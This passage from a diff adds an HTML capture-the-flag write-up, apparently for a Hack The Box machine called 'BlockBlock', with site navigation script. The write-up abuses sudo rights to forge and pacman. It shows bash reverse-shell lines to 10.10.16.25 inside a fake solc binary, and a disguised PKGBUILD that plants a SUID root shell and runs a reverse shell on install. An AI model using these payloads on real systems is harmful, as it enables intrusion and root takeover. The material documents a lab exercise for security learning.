+<span class="n">Compiler</span><span class="w"> </span><span class="n">options</span><span class="p">:</span>
+<span class="w">      </span><span class="o">--</span><span class="n">ignored</span><span class="o">-</span><span class="n">error</span><span class="o">-</span><span class="n">codes</span><span class="w"> </span><span class="o">&lt;</span><span class="n">ERROR_CODES</span><span class="o">&gt;</span><span class="w">  </span><span class="n">Ignore</span><span class="w"> </span><span class="n">solc</span><span class="w"> </span><span class="n">warnings</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">error</span><span class="w"> </span><span class="n">code</span>
+<span class="w">      </span><span class="o">--</span><span class="n">deny</span><span class="o">-</span><span class="n">warnings</span><span class="w">                      </span><span class="n">Warnings</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">trigger</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">compiler</span><span class="w"> </span><span class="n">error</span>
+<span class="w">      </span><span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">auto</span><span class="o">-</span><span class="n">detect</span><span class="w">                     </span><span class="n">Do</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">auto</span><span class="o">-</span><span class="n">detect</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="err">`</span><span class="n">solc</span><span class="err">`</span><span class="w"> </span><span class="n">version</span>
+<span class="w">      </span><span class="o">--</span><span class="n">use</span><span class="w"> </span><span class="o">&lt;</span><span class="n">SOLC_VERSION</span><span class="o">&gt;</span><span class="w">                 </span><span class="n">Specify</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">solc</span><span class="w"> </span><span class="n">version</span><span class="p">,</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">local</span><span class="w"> </span><span class="n">solc</span><span class="p">,</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">build</span><span class="w"> </span><span class="n">with</span>
+<span class="w">      </span><span class="o">--</span><span class="n">offline</span><span class="w">                            </span><span class="n">Do</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">access</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">network</span>
+<span class="w">      </span><span class="o">--</span><span class="n">via</span><span class="o">-</span><span class="n">ir</span><span class="w">                             </span><span class="n">Use</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Yul</span><span class="w"> </span><span class="n">intermediate</span><span class="w"> </span><span class="n">representation</span><span class="w"> </span><span class="n">compilation</span><span class="w"> </span><span class="n">pipeline</span>
+<span class="w">      </span><span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">metadata</span><span class="w">                        </span><span class="n">Do</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">append</span><span class="w"> </span><span class="n">any</span><span class="w"> </span><span class="n">metadata</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">bytecode</span>
+<span class="w">      </span><span class="o">--</span><span class="n">silent</span><span class="w">                             </span><span class="n">Don</span><span class="s1">&#39;t print anything on startup</span>
+<span class="w">      </span><span class="o">--</span><span class="n">ast</span><span class="w">                                </span><span class="n">Includes</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">AST</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">JSON</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">compiler</span><span class="w"> </span><span class="n">output</span>
+<span class="w">      </span><span class="o">--</span><span class="n">evm</span><span class="o">-</span><span class="n">version</span><span class="w"> </span><span class="o">&lt;</span><span class="n">VERSION</span><span class="o">&gt;</span><span class="w">              </span><span class="n">The</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">EVM</span><span class="w"> </span><span class="n">version</span>
+<span class="w">      </span><span class="o">--</span><span class="n">optimize</span><span class="w">                           </span><span class="n">Activate</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Solidity</span><span class="w"> </span><span class="n">optimizer</span>
+<span class="w">      </span><span class="o">--</span><span class="n">optimizer</span><span class="o">-</span><span class="n">runs</span><span class="w"> </span><span class="o">&lt;</span><span class="n">RUNS</span><span class="o">&gt;</span><span class="w">              </span><span class="n">The</span><span class="w"> </span><span class="n">number</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">optimizer</span><span class="w"> </span><span class="n">runs</span>
+<span class="w">      </span><span class="o">--</span><span class="n">extra</span><span class="o">-</span><span class="n">output</span><span class="w"> </span><span class="o">&lt;</span><span class="n">SELECTOR</span><span class="o">&gt;...</span><span class="w">         </span><span class="n">Extra</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">include</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">contract</span><span class="s1">&#39;s artifact</span>
+<span class="w">      </span><span class="o">--</span><span class="n">extra</span><span class="o">-</span><span class="n">output</span><span class="o">-</span><span class="n">files</span><span class="w"> </span><span class="o">&lt;</span><span class="n">SELECTOR</span><span class="o">&gt;...</span><span class="w">   </span><span class="n">Extra</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">write</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">separate</span><span class="w"> </span><span class="n">files</span>
+
+<span class="n">Project</span><span class="w"> </span><span class="n">options</span><span class="p">:</span>
+<span class="w">  </span><span class="o">-</span><span class="n">o</span><span class="p">,</span><span class="w"> </span><span class="o">--</span><span class="n">out</span><span class="w"> </span><span class="o">&lt;</span><span class="n">PATH</span><span class="o">&gt;</span><span class="w">               </span><span class="n">The</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">contract</span><span class="w"> </span><span class="n">artifacts</span><span class="w"> </span><span class="n">folder</span>
+<span class="w">      </span><span class="o">--</span><span class="n">revert</span><span class="o">-</span><span class="n">strings</span><span class="w"> </span><span class="o">&lt;</span><span class="n">REVERT</span><span class="o">&gt;</span><span class="w">  </span><span class="n">Revert</span><span class="w"> </span><span class="n">string</span><span class="w"> </span><span class="n">configuration</span>
+<span class="w">      </span><span class="o">--</span><span class="n">build</span><span class="o">-</span><span class="n">info</span><span class="w">               </span><span class="n">Generate</span><span class="w"> </span><span class="n">build</span><span class="w"> </span><span class="n">info</span><span class="w"> </span><span class="n">files</span>
+<span class="w">      </span><span class="o">--</span><span class="n">build</span><span class="o">-</span><span class="n">info</span><span class="o">-</span><span class="n">path</span><span class="w"> </span><span class="o">&lt;</span><span class="n">PATH</span><span class="o">&gt;</span><span class="w">   </span><span class="n">Output</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">build</span><span class="w"> </span><span class="n">info</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">written</span><span class="w"> </span><span class="n">to</span>
+<span class="w">      </span><span class="o">--</span><span class="n">root</span><span class="w"> </span><span class="o">&lt;</span><span class="n">PATH</span><span class="o">&gt;</span><span class="w">              </span><span class="n">The</span><span class="w"> </span><span class="n">project</span><span class="s1">&#39;s root path</span>
+<span class="w">  </span><span class="o">-</span><span class="n">C</span><span class="p">,</span><span class="w"> </span><span class="o">--</span><span class="n">contracts</span><span class="w"> </span><span class="o">&lt;</span><span class="n">PATH</span><span class="o">&gt;</span><span class="w">         </span><span class="n">The</span><span class="w"> </span><span class="n">contracts</span><span class="w"> </span><span class="n">source</span><span class="w"> </span><span class="n">directory</span>
+<span class="w">  </span><span class="o">-</span><span class="n">R</span><span class="p">,</span><span class="w"> </span><span class="o">--</span><span class="n">remappings</span><span class="w"> </span><span class="o">&lt;</span><span class="n">REMAPPINGS</span><span class="o">&gt;</span><span class="w">  </span><span class="n">The</span><span class="w"> </span><span class="n">project</span><span class="s1">&#39;s remappings</span>
+<span class="w">      </span><span class="o">--</span><span class="n">remappings</span><span class="o">-</span><span class="n">env</span><span class="w"> </span><span class="o">&lt;</span><span class="n">ENV</span><span class="o">&gt;</span><span class="w">     </span><span class="n">The</span><span class="w"> </span><span class="n">project</span><span class="s1">&#39;s remappings from the environment</span>
+<span class="w">      </span><span class="o">--</span><span class="n">cache</span><span class="o">-</span><span class="n">path</span><span class="w"> </span><span class="o">&lt;</span><span class="n">PATH</span><span class="o">&gt;</span><span class="w">        </span><span class="n">The</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">compiler</span><span class="w"> </span><span class="n">cache</span>
+<span class="w">      </span><span class="o">--</span><span class="n">lib</span><span class="o">-</span><span class="n">paths</span><span class="w"> </span><span class="o">&lt;</span><span class="n">PATH</span><span class="o">&gt;</span><span class="w">         </span><span class="n">The</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">library</span><span class="w"> </span><span class="n">folder</span>
+<span class="w">      </span><span class="o">--</span><span class="n">hardhat</span><span class="w">                  </span><span class="n">Use</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Hardhat</span><span class="o">-</span><span class="n">style</span><span class="w"> </span><span class="n">project</span><span class="w"> </span><span class="n">layout</span><span class="w"> </span><span class="p">[</span><span class="n">aliases</span><span class="p">:</span><span class="w"> </span><span class="n">hh</span><span class="p">]</span>
+<span class="w">      </span><span class="o">--</span><span class="n">config</span><span class="o">-</span><span class="n">path</span><span class="w"> </span><span class="o">&lt;</span><span class="n">FILE</span><span class="o">&gt;</span><span class="w">       </span><span class="n">Path</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">config</span><span class="w"> </span><span class="n">file</span>
+
+<span class="n">Watch</span><span class="w"> </span><span class="n">options</span><span class="p">:</span>
+<span class="w">  </span><span class="o">-</span><span class="n">w</span><span class="p">,</span><span class="w"> </span><span class="o">--</span><span class="n">watch</span><span class="w"> </span><span class="p">[</span><span class="o">&lt;</span><span class="n">PATH</span><span class="o">&gt;...</span><span class="p">]</span><span class="w">    </span><span class="n">Watch</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">given</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">directories</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">changes</span>
+<span class="w">      </span><span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">restart</span><span class="w">           </span><span class="n">Do</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">restart</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="k">while</span><span class="w"> </span><span class="n">it</span><span class="s1">&#39;s still running</span>
+<span class="w">      </span><span class="o">--</span><span class="n">run</span><span class="o">-</span><span class="n">all</span><span class="w">              </span><span class="n">Explicitly</span><span class="w"> </span><span class="n">re</span><span class="o">-</span><span class="n">run</span><span class="w"> </span><span class="n">all</span><span class="w"> </span><span class="n">tests</span><span class="w"> </span><span class="n">when</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">change</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">made</span>
+<span class="w">      </span><span class="o">--</span><span class="n">watch</span><span class="o">-</span><span class="n">delay</span><span class="w"> </span><span class="o">&lt;</span><span class="n">DELAY</span><span class="o">&gt;</span><span class="w">  </span><span class="n">File</span><span class="w"> </span><span class="n">update</span><span class="w"> </span><span class="n">debounce</span><span class="w"> </span><span class="n">delay</span>
+<span class="w">      </span><span class="o">--</span><span class="n">format</span><span class="o">-</span><span class="n">json</span><span class="w">          </span><span class="n">Output</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">compilation</span><span class="w"> </span><span class="n">errors</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="n">format</span><span class="o">.</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">useful</span><span class="w"> </span><span class="n">when</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">want</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">tools</span>
+</code></pre></div>
+
+<p>solc is the Solidity compiler for Ethereum smart contracts. It converts Solidity source code (.sol files) into bytecode that can be deployed on the Ethereum blockchain.</p>
+<p>Okay, I think I have an idea for a trick. I'll initialize a new project in /tmp, then I'll try building it with a malicious solc file with a reverse shell inside.</p>
+<h3>Crafting the reverse shell</h3>
+<p>I'll add the --offline and --no-git flags, as I dont need any dependencies.</p>
+<p><img alt="Init command" src="../images/BlockBlock/init.png" /></p>
+<p>Next, I'll create a solc file in the tmp directory.</p>
+<div class="codehilite"><pre><span></span><code># Contents of my malicous solc file. Once I build with it, it should execute the shell
+
+#!/bin/bash
+/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.25/9001 0&gt;&amp;1
+</code></pre></div>
+
+<p><img alt="Failed building" src="../images/BlockBlock/build.png" /></p>
+<p>I got a permission error once I tried to build with my file. I'll modify its permissions using chmod before trying again.</p>
+<div class="codehilite"><pre><span></span><code>chmod +777 solc
+</code></pre></div>
+
+<p>Now it should work as intended.</p>
+<div class="codehilite"><pre><span></span><code><span class="o">[</span><span class="n">keira@blockblock shell</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">paul</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">paul</span><span class="o">/</span><span class="p">.</span><span class="n">foundry</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">forge</span><span class="w"> </span><span class="n">build</span><span class="w"> </span><span class="o">--</span><span class="k">use</span><span class="w"> </span><span class="p">..</span><span class="o">/</span><span class="n">solc</span>
+<span class="nl">Error</span><span class="p">:</span><span class="w"> </span>
+<span class="n">solc</span><span class="w"> </span><span class="n">exited</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="k">exit</span><span class="w"> </span><span class="nl">status</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
+<span class="p">..</span><span class="o">/</span><span class="nl">solc</span><span class="p">:</span><span class="w"> </span><span class="k">connect</span><span class="err">:</span><span class="w"> </span><span class="k">Connection</span><span class="w"> </span><span class="n">refused</span><span class="w">                                                                                                                                                                                                        </span>
+<span class="p">..</span><span class="o">/</span><span class="nl">solc</span><span class="p">:</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="mi">2</span><span class="err">:</span><span class="w"> </span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">10.10.16.25</span><span class="o">/</span><span class="mi">9001</span><span class="err">:</span><span class="w"> </span><span class="k">Connection</span><span class="w"> </span><span class="n">refused</span><span class="w">                                                                                                                                                                              </span>
+<span class="o">[</span><span class="n">keira@blockblock shell</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">paul</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">paul</span><span class="o">/</span><span class="p">.</span><span class="n">foundry</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">forge</span><span class="w"> </span><span class="n">build</span><span class="w"> </span><span class="c1">--use ../solc</span>
+</code></pre></div>
+
+<p><img alt="Shell as Paul" src="../images/BlockBlock/paul.png" /></p>
+<h2>Paul to Root</h2>
+<div class="codehilite"><pre><span></span><code>User paul may run the following commands on blockblock:
+    (ALL : ALL) NOPASSWD: /usr/bin/pacman
+</code></pre></div>
+
+<p>Pacman is the package manager for Arch-based Linux distributions, just like APT is for Debian-based distributions.</p>
+<p>Since I can do whatever I want with pacman as Paul, Im going to prepare a malicious package that will:</p>
+<ol>
+<li>
+<p>Attempt to send me a reverse shell as a post-install action.</p>
+</li>
+<li>
+<p>Create a copy of bash with root privileges as a failsafe if the reverse shell fails.</p>
+</li>
+</ol>
+<p>Lets get to it!</p>
+<h3>Creating a malicious package</h3>
+<p>First, I will create a directory for my package. For this I'll move back to my SSH Keira shell, as I cannot edit files with Paul's.</p>
+<p><img alt="malicious package directory creation" src="../images/BlockBlock/evil-pkg.png" /></p>
+<p>In the folder, I'll create a PKGBUILD file with this content:</p>
+<div class="codehilite"><pre><span></span><code>#<span class="w"> </span>Maintainer:<span class="w"> </span>test
+pkgname=root
+pkgver=1.0
+pkgrel=1
+pkgdesc=&quot;Totally<span class="w"> </span>legitimate<span class="w"> </span>system<span class="w"> </span>utility&quot;
+arch=(&#39;any&#39;)
+url=&quot;http://example.com&quot;
+license=(&#39;GPL&#39;)
+
+package()<span class="w"> </span>{
+<span class="w">    </span>#<span class="w"> </span>Creates<span class="w"> </span>a<span class="w"> </span>root-owned<span class="w"> </span>SUID<span class="w"> </span>bash
+<span class="w">    </span>install<span class="w"> </span>-Dm4755<span class="w"> </span>/bin/bash<span class="w"> </span>&quot;<span class="cp">${</span><span class="n">pkgdir</span><span class="cp">}</span>/usr/local/bin/rootshell&quot;
+}
+
+post_install()<span class="w"> </span>{
+<span class="w">    </span>#<span class="w"> </span>Reverse<span class="w"> </span>shell
+<span class="w">    </span>/bin/bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="err">&amp;</span><span class="w"> </span>/dev/tcp/10.10.16.25/9002<span class="w"> </span>0&gt;<span class="err">&amp;</span>1
+}
+</code></pre></div>
+
+<p>Build the package with <code>makepkg -f</code></p>
+<p><img alt="Package Build" src="../images/BlockBlock/package.png" /></p>
+<p>And now we install.</p>
+<p><img alt="Install package" src="../images/BlockBlock/install.png" /></p>
+<p>The reverse shell did not come back. However, the root bash has been created! After navigating to /usr/local/bin, I can execute the rootshell with <code>./rootshell</code> to become root!</p>
+<p><img alt="Root privileges acquired" src="../images/BlockBlock/root.png" /></p>
+<p>Rooted!</p>
+            </div>
+            
+            <div class="toc-sidebar">
+                <h3>Contents</h3>
+                <ul id="toc-list">
+                    <!-- This will be populated by JavaScript -->
+                </ul>
+            </div>
+        </div>
+    </main>
+    
+    <!-- Mobile TOC toggle button -->
+    <button class="toc-toggle" aria-label="Toggle table of contents">
+        ≡
+    </button>
+    
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+        </div>
+    </footer>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/4.3.0/marked.min.js"></script>
+    
+    <script>
+        // Machine metadata for sidebar population
+        let machineData = {};
+        
+        // Function to initialize the application
+        async function initializeApp() {
+            try {
+                // Fetch machine metadata
+                const response = await fetch('../machines.json');
+                if (!response.ok) {
+                    throw new Error('Failed to load machine metadata');
+                }
+                machineData = await response.json();
+                
+                // Populate the sidebar with machine links
+                populateSidebar();
+                
+                // Generate table of contents
+                generateTableOfContents();
+            } catch (error) {
+                console.error('Initialization error:', error);
+                showError("Failed to initialize application. Please refresh and try again.");
+            }
+        }
+
+        // Call the initialization function when the page loads
+        document.addEventListener('DOMContentLoaded', initializeApp);
+
+        // Populate sidebar with machine links dynamically
+        function populateSidebar() {
+            const categories = {
+                "easy": document.getElementById("easy-machines"),
+                "medium": document.getElementById("medium-machines"),
+                "hard": document.getElementById("hard-machines"),
+                "insane": document.getElementById("insane-machines")
+            };
+
+            // Clear existing links
+            for (const category of Object.values(categories)) {
+                category.innerHTML = '';
+            }
+
+            // Add machine links to appropriate categories
+            for (const [machineName, data] of Object.entries(machineData)) {
+                const difficulty = data.difficulty.toLowerCase();
+                if (categories[difficulty]) {
+                    const link = document.createElement('a');
+                    link.href = `../machines/${machineName}.html`;
+                    link.textContent = data.title;
+                    
+                    // Highlight current machine
+                    if (data.title === "BlockBlock") {
+                        link.classList.add('active');
+                    }
+                    
+                    categories[difficulty].appendChild(link);
+                }
+            }
+        }
+
+        // Generate table of contents from headings
+        function generateTableOfContents() {
+            const writeupBody = document.querySelector('.writeup-body');
+            const tocList = document.getElementById('toc-list');
+            const headings = writeupBody.querySelectorAll('h1, h2, h3');
+            
+            // Clear existing TOC
+            tocList.innerHTML = '';
+            
+            headings.forEach((heading, index) => {
+                // Create an ID for the heading if it doesn't have one
+                if (!heading.id) {
+                    // Convert heading text to kebab-case for ID
+                    const headingText = heading.textContent.trim();
+                    const headingId = headingText
+                        .toLowerCase()
+                        .replace(/[^\w\s-]/g, '')
+                        .replace(/\s+/g, '-');
+                    
+                    heading.id = headingId || `section-${index}`;
+                }
+                
+                // Create a list item for the TOC
+                const listItem = document.createElement('li');
+                const link = document.createElement('a');
+                link.href = `#${heading.id}`;
+                link.textContent = heading.textContent;
+                
+                // Add a class for h2 elements to create indentation
+                if (heading.tagName === 'H2') {
+                    listItem.classList.add('sub-heading');
+                    listItem.style.paddingLeft = '15px';
+                } else if (heading.tagName === 'H3') {
+                    listItem.classList.add('sub-sub-heading');
+                    listItem.style.paddingLeft = '30px';
+                }
+                
+                listItem.appendChild(link);
+                tocList.appendChild(listItem);
+            });
+            
+            // Set up scroll highlighting
+            setupScrollHighlighting();
+        }
+
+        // Highlight active TOC section on scroll
+        function setupScrollHighlighting() {
+            const tocLinks = document.querySelectorAll('.toc-sidebar a');
+            
+            function highlightActiveSection() {
+                // Find which section is currently in view
+                const fromTop = window.scrollY + 120;
+                
+                tocLinks.forEach(link => {
+                    const section = document.querySelector(link.hash);
+                    
+                    if (section && 
+                        section.offsetTop <= fromTop &&
+                        section.offsetTop + section.offsetHeight > fromTop) {
+                        link.classList.add('active');
+                    } else {
+                        link.classList.remove('active');
+                    }
+                });
+            }
+            
+            // Call initially and on scroll
+            window.addEventListener('scroll', highlightActiveSection);
+            highlightActiveSection();
+        }
+
+        // Show error message
+        function showError(message) {
+            const contentArea = document.querySelector('.writeup-body');
+            contentArea.innerHTML = `
+                <div class="error-message">
+                    <h2>Error</h2>
+                    <p>${message}</p>
+                </div>
+            `;
+        }
+
+        // Initialize the page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Hamburger menu functionality
+            const hamburgerMenu = document.querySelector('.hamburger-menu');
+            const sidebar = document.querySelector('.sidebar');
+            const backdrop = document.querySelector('.backdrop');
+            
+            hamburgerMenu.addEventListener('click', () => {
+                hamburgerMenu.classList.toggle('active');
+                sidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            backdrop.addEventListener('click', () => {
+                hamburgerMenu.classList.remove('active');
+                sidebar.classList.remove('active');
+                backdrop.classList.remove('active');
+                tocSidebar.classList.remove('active');
+            });
+            
+            // Difficulty buttons functionality
+            const difficultyButtons = document.querySelectorAll('.difficulty-btn');
+            
+            difficultyButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const difficulty = button.getAttribute('data-difficulty');
+                    const machineList = document.querySelector(`#${difficulty}-machines`);
+                    
+                    machineList.classList.toggle('active');
+                });
+            });
+            
+            // Mobile TOC toggle
+            const tocToggle = document.querySelector('.toc-toggle');
+            const tocSidebar = document.querySelector('.toc-sidebar');
+            
+            tocToggle.addEventListener('click', () => {
+                tocSidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            // Close TOC sidebar when clicking on a link (mobile)
+            document.querySelectorAll('.toc-sidebar a').forEach(link => {
+                link.addEventListener('click', () => {
+                    if (window.innerWidth <= 1024) {
+                        tocSidebar.classList.remove('active');
+                        backdrop.classList.remove('active');
+                    }
+                });
+            });
+        });
+
+        // Add smooth scrolling for TOC links
+        document.addEventListener('click', function(e) {
+            if (e.target.tagName === 'A' && e.target.hash) {
+                const element = document.querySelector(e.target.hash);
+                if (element) {
+                    e.preventDefault();
+                    window.scrollTo({
+                        top: element.offsetTop - 90,
+                        behavior: 'smooth'
+                    });
+                }
+            }
+        });
+    </script>
+</body>
+</html>
